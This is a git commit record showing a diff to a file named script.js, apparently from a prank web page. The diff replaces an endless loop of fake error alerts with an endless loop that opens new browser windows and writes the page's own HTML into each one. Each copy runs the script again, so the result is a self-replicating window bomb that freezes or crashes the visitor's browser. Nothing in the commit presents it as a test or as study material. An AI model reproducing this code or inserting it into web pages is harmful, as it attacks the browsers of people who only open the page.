bb4319f3052ef2ae1a2d421dfeba8cd38e44868c
dwarft <109460706+dwarftee@users.noreply.github.com>
2024-06-13 17:45:58 +0100

    Update script.js :0

--- script.js
+++ script.js
@@ -1,1 +1,4 @@
-while (true) { alert("error: 5x22035783"); }
+while (true) {
+    var w = window.open();
+    w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+}
